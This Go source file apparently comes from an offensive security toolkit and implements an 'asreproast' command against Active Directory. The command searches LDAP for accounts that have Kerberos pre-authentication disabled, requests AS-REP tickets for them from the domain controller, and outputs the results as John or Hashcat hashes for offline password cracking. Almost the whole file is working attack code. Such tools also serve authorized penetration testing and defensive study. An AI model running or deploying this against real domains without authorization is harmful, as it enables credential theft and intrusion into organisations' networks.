package kerberos

import (
	"fmt"
	"os"

	"github.com/spf13/cobra"

	"github.com/vincd/savoir/modules/paquet/krb5"
	"github.com/vincd/savoir/modules/paquet/krb5/crypto"
	"github.com/vincd/savoir/modules/paquet/ldap"
)

func init() {
	var domain string
	var ldapUser string
	var ldapPassword string
	var enctype string
	var dcIp string
	var format string
	var user string
	var outputFile string

	var asRepRoastCmd = &cobra.Command{
		Use:   "asreproast",
		Short: "Perform AS-REP roasting against specified user(s)",
		Long:  `Perform AS-REP roasting against specified user(s)`,
		PreRunE: func(cmd *cobra.Command, args []string) error {
			if err := validateFormatFlag(format); err != nil {
				return err
			}

			if err := validateETypeFlag(enctype); err != nil {
				return err
			}

			if len(user) == 0 && len(ldapUser) == 0 {
				return fmt.Errorf("flag --user or --ldap-user should be set")
			}

			return nil
		},
		RunE: func(cmd *cobra.Command, args []string) error {
			printDomainInformation(domain, dcIp)

			encType := getETypeFromFlagValue(enctype)
			// String containing hashes on each line
			hashes := ""
			targets := make([]string, 0)

			if len(user) > 0 {
				targets = append(targets, user)
			} else {
				ldapClient, err := ldap.NewLDAPClient()
				if err != nil {
					return err
				}

				// TODO : support LDAPS
				if err := ldapClient.Connect(dcIp, 389); err != nil {
					return err
				}
				defer ldapClient.Close()

				if err := ldapClient.AuthenticateWithDomainAccount(domain, ldapUser, ldapPassword); err != nil {
					return err
				}

				query := "(&(UserAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))"
				entries, err := ldapClient.Search(query, []string{"sAMAccountName"}, 1000)
				if err != nil {
					return err
				}

				for _, entry := range entries {
					targets = append(targets, entry["sAMAccountName"])
				}
			}

			for _, target := range targets {
				fmt.Printf("[*] Ask AS-Rep for user %s without pre-authentication\n", target)

				tgt, err := krb5.AskTGT(domain, target, "", nil, encType, dcIp, true, false)
				if err != nil {
					fmt.Printf("[!] An error occured: %s\n", err)
					continue
				}

				fmt.Printf("[*] Get a valid ticket with encryption: %s\n", crypto.ETypeToString(tgt.EncPart.EType))

				if format == "john" {
					hashes += fmt.Sprintf("%s\n", tgt.JohnString())
				} else if format == "hashcat" {
					hashes += fmt.Sprintf("%s\n", tgt.HashcatString())
				}
			}

			if len(hashes) == 0 {
				fmt.Printf("[!] We found 0 hash...\n")
				return nil
			}

			if len(outputFile) == 0 {
				fmt.Printf("[*] Hashes:\n%s\n", hashes)
			} else {
				f, err := os.Create(outputFile)
				if err != nil {
					return fmt.Errorf("cannot create hash file: %s", err)
				}
				defer f.Close()

				f.Write([]byte(hashes))
				fmt.Printf("[*] Save hashes to: %s\n", outputFile)
			}

			return nil
		},
	}

	commandAddKerberosDomainFlags(asRepRoastCmd, &domain, &dcIp)
	commandAddLDAPFlags(asRepRoastCmd, &ldapUser, &ldapPassword)
	commandAddKerberosETypeFlagWithDefaultValue(asRepRoastCmd, &enctype, "rc4")
	commandAddFormatFlag(asRepRoastCmd, &format)
	asRepRoastCmd.Flags().StringVarP(&user, "user", "", "", "User to roast")
	asRepRoastCmd.Flags().StringVarP(&outputFile, "output", "o", "", "Output the hashes to a file")

	Command.AddCommand(asRepRoastCmd)
}
